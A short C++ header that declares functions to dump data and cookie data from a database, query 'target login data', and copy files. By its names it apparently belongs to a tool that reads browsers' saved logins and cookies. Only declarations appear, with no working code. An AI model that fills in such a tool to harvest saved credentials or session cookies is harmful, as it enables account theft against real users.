#pragma once

#ifndef DATADUMP_H
#define DATADUMP_H

#include "includes\Imports.h"
#include "includes\DataHolder.h"

bool dump_data(const std::string& db_path, std::vector<DataHolder> data_array, int data_index);
bool dump_cookie_data(const std::string& db_path, std::vector<DataHolder> data_array, int data_index);
sqlite3_stmt* query_database(std::string target_login_data, const char* database_query);
BOOL custom_copy_file(const std::string& sourceFile, const std::string& destinationFile);

#endif // DATADUMP_H